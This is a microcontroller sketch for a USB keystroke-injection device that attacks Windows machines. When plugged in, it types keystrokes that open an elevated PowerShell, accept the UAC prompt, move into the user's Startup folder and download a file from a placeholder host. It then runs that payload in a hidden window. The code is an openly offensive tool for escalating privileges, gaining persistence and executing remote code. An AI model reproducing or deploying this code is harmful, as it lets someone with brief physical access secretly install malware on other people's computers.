const unsigned int ledPin = 17;
const unsigned int delayTime = 1500;
void setup()
{
  delay(1000);



  // Do the shit...
  pwn();

}

// Open an application on Windows via Run
void openapp(String app)
{
  // Windows Key + R to open Run
  key(KEY_R , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

  // Type the App you want to open
  Keyboard.print(app);
  key(KEY_ENTER, 0);
  Keyboard.send_now();
  delay(delayTime);
}

void key(int KEY, int MODIFIER)
 {
  Keyboard.set_modifier(MODIFIER);
  Keyboard.set_key1(KEY);
  Keyboard.send_now();
  delay(20);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(20);
 }

void pwn()
{

  key(KEY_D , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

openapp("powershell Start-Process powershell -Verb runAs");
delay(2000);
key(KEY_LEFT, 0);
delay(500);
key(KEY_ENTER, 0);
delay(1800);
Keyboard.println("cmd");
delay(300);
Keyboard.println("cd %userprofile%");
Keyboard.println("cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
delay(200);
Keyboard.println("powershell");
delay(200);
Keyboard.println("$client = new-object System.Net.WebClient");
Keyboard.println("$client.DownloadFile('HOST','PAYLOAD')");
delay(200);
Keyboard.println("cmd");
delay(800);
Keyboard.println("PowerShell.exe -WindowStyle Hidden -Command PAYLOAD");



}


void loop() {

}
